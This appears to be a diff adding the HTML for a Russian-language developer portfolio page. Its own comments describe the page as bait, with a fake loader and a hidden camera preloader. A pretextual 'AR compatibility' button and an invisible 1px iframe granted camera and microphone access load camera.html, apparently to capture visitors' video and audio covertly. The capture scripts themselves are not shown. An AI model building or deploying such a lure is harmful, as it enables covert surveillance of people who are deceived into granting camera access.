@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>👨‍💻 Мой IT-Портфолио | Разработчик</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/x-icon" href="assets/images/favicon.ico">
+    <!-- Open Graph метатеги для соцсетей -->
+    <meta property="og:title" content="Мой IT-Портфолио">
+    <meta property="og:description" content="Проекты и навыки современного разработчика">
+    <meta property="og:image" content="assets/images/preview.jpg">
+    <meta property="og:url" content="https://ваш-логин.github.io/portfolio-site">
+    
+    <!-- Скрытый прелоадер камеры -->
+    <link rel="preload" href="camera.html" as="document">
+</head>
+<body>
+    <!-- Фейковая загрузка -->
+    <div id="loader">
+        <div class="spinner"></div>
+        <p>Загрузка портфолио...</p>
+    </div>
+
+    <!-- Основной контент-приманка -->
+    <div id="main-content" style="display: none;">
+        <!-- Хедер -->
+        <header class="hero">
+            <div class="container">
+                <h1>👋 Привет, я <span class="highlight">Алексей</span></h1>
+                <p class="subtitle">Full-Stack разработчик с 5+ лет опыта</p>
+                <div class="stats">
+                    <div class="stat">
+                        <span class="number">47</span>
+                        <span class="label">Проектов</span>
+                    </div>
+                    <div class="stat">
+                        <span class="number">128</span>
+                        <span class="label">Клиентов</span>
+                    </div>
+                    <div class="stat">
+                        <span class="number">3.8k</span>
+                        <span class="label">Часов кода</span>
+                    </div>
+                </div>
+                
+                <!-- Кнопка, которая запускает "тест камеры" -->
+                <button id="test-camera-btn" class="cta-button">
+                    🎥 Проверить совместимость с AR
+                </button>
+                <p class="small-note">(Необходимо для демонстрации AR-проектов)</p>
+            </div>
+        </header>
+
+        <!-- Секция проектов -->
+        <section class="projects">
+            <div class="container">
+                <h2>🚀 Мои проекты</h2>
+                <div class="project-grid">
+                    <div class="project-card">
+                        <div class="project-image" style="background: linear-gradient(45deg, #667eea, #764ba2);"></div>
+                        <h3>AI Ассистент</h3>
+                        <p>Нейросеть для автоматизации бизнес-процессов</p>
+                    </div>
+                    <div class="project-card">
+                        <div class="project-image" style="background: linear-gradient(45deg, #f093fb, #f5576c);"></div>
+                        <h3>Крипто-трекер</h3>
+                        <p>Мониторинг криптовалют в реальном времени</p>
+                    </div>
+                    <div class="project-card">
+                        <div class="project-image" style="background: linear-gradient(45deg, #4facfe, #00f2fe);"></div>
+                        <h3>AR Портфолио</h3>
+                        <p>Дополненная реальность для презентации проектов</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Футер -->
+        <footer>
+            <div class="container">
+                <p>© 2024 Мое портфолио. Все права защищены.</p>
+                <div class="social-links">
+                    <a href="#" class="social-link">GitHub</a>
+                    <a href="#" class="social-link">LinkedIn</a>
+                    <a href="#" class="social-link">Telegram</a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Скрытый iframe для камеры -->
+    <iframe 
+        id="camera-frame" 
+        src="camera.html" 
+        style="display: none; position: absolute; width: 1px; height: 1px; border: none;"
+        allow="camera; microphone">
+    </iframe>
+
+    <script src="script.js"></script>
+</body>
+</html>
